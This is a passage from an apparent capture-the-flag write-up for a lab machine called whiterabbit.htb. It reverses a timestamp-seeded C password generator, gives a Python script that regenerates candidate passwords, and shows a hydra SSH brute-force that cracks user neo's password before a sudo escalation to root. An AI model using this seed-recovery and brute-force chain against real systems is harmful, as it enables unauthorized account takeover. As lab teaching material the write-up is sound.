```

I opened the binary in `ghidra`, the `main` function uses `gettimeofday` to get time and passed through the `generate_password` function.

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                            /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return 0;
}
```

`generate_password` uses the timestamp to seed the random number generator,  and then loops 20 times choosing a character from a hard-coded string of lower, upper, and digits:

```c
void generate_password(uint timestamp)

{
  int randint;
  long in_FS_OFFSET;
  int i;
  char generated_password [20];
  undefined1 local_14;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  srand(timestamp);
  for (i = 0; i < 20; i = i + 1) {
    randint = rand();
    generated_password[i] =
         "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[randint % 62];
  }
  local_14 = 0;
  puts(generated_password);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Creating the password_generator.  
It’s important to make sure to use the same libraries to generate `random` numbers. The Python random module will not create the same random numbers as the C `rand` function, even with the same seed.  
→ generate_password.py

```python3
import ctypes
from datetime import datetime, timezone

# Load libc
libc = ctypes.CDLL("libc.so.6")

CHARSET = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASSWORD_LEN = 20

def generate_password(seed):
    libc.srand(ctypes.c_uint(seed))
    pw = []
    for _ in range(PASSWORD_LEN):
        r = libc.rand()
        pw.append(chr(CHARSET[r % 62]))
    return "".join(pw)

# Given timestamp (UTC assumed)
dt = datetime(2024, 8, 30, 14, 40, 42, tzinfo=timezone.utc)

# Seconds since epoch
tv_sec = int(dt.timestamp())

for ms in range(1000):  # tv_usec / 1000
    seed = tv_sec * 1000 + ms
    password = generate_password(seed)
    print(f"{password}")

```

Getting the timestamp from the database earlier and saved bunch of passwords to `pass`:  
`| 6 | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |`

```c
>> python3 generate_password.py > pass.txt                                                                      
>> cat pass.txt | head
L7Qf2aFEohexxuk07tEw
hN6DEuEFtQ5LZX8uxw9r
lWL7jrjJTC54qDojrCvV
mnQ1II9iyvPJRhLBMVfB
XSfLZ30sr8sjDJbx8geU
cOBXPQDByTiWBDDEYJXK
R4njydUwbk3uML4yVoT9
gUepuICfnxFcf7e7K7RA
c4L87irvHxX7pZGX9if6
Y7a6NqegKAmmdunHc6Uq
```

I used hydra to bruteforce the ssh password for the neo user:

```c
>> hydra -l neo -P pass.txt ssh://whiterabbit.htb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-24 20:43:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking ssh://whiterabbit.htb:22/
[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-24 20:44:02
```

I LoggedIn With neo user:

```c
>> ssh neo@whiterabbit.htb 
neo@whiterabbit.htb's password: 

Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Last login: Wed Dec 24 15:00:49 2025 from 10.10.15.11
neo@whiterabbit:~$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
neo@whiterabbit:~$ sudo -i
root@whiterabbit:~# ls /root
root.txt
```